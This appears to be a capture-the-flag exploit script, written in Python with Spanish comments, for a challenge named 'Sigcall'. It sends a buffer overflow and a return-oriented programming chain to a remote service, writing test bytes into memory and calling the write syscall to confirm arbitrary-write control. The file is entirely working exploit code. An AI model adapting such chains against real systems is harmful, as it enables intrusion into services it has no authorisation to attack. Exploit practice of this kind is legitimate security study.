#!/usr/bin/env python3
"""Sigcall - paso 1: confirmar escritura arbitraria y syscall write."""
import socket
import struct
import sys
import time

HOST, PORT = "<host>", 28807

p64 = lambda x: struct.pack("<Q", x)

POP_R9      = 0x401178   # pop r9 ; nop ; nop ; pop rbp ; ret
POP_RDI     = 0x4011CF   # pop rdi ; ret
WRITE_QWORD = 0x401182   # mov qword ptr [rdi], r9 ; nop ; nop ; pop rbp ; ret
POP_RAX     = 0x4011A6   # pop rax ; nop ; nop ; pop rbp ; ret
POP_RSI_R15 = 0x4011CD   # pop rsi ; pop r15 ; ret
POP_RDX_RBP = 0x4011B0   # pop rdx ; nop ; nop ; pop rbp ; ret
SYSCALL     = 0x401161
RET         = 0x401016
OFFSET      = 136

BSS = 0x404028


def set_r9(v):  return p64(POP_R9) + p64(v) + p64(0)
def set_rdi(v): return p64(POP_RDI) + p64(v)
def write_q(addr, val): return set_r9(val) + set_rdi(addr) + p64(WRITE_QWORD) + p64(0)
def set_rax(v): return p64(POP_RAX) + p64(v) + p64(0)
def set_rsi(v): return p64(POP_RSI_R15) + p64(v) + p64(0)
def set_rdx(v): return p64(POP_RDX_RBP) + p64(v) + p64(0)


def talk(payload, read_time=4.0):
    s = socket.create_connection((HOST, PORT), timeout=10)
    s.settimeout(3)
    banner = s.recv(4096)
    s.sendall(payload)
    time.sleep(read_time)
    out = b""
    s.settimeout(1.5)
    try:
        while True:
            d = s.recv(65536)
            if not d:
                break
            out += d
    except socket.timeout:
        pass
    s.close()
    return banner, out


if __name__ == "__main__":
    payload = b"A" * OFFSET
    payload += write_q(0x404028, 0x4847464544434241)  # "ABCDEFGH"
    payload += set_rax(1) + set_rdi(1) + set_rsi(0x404028) + set_rdx(8)
    payload += p64(SYSCALL)
    print(f"payload: {len(payload)} bytes")
    b, out = talk(payload)
    print("banner:", b)
    print("out   :", out)
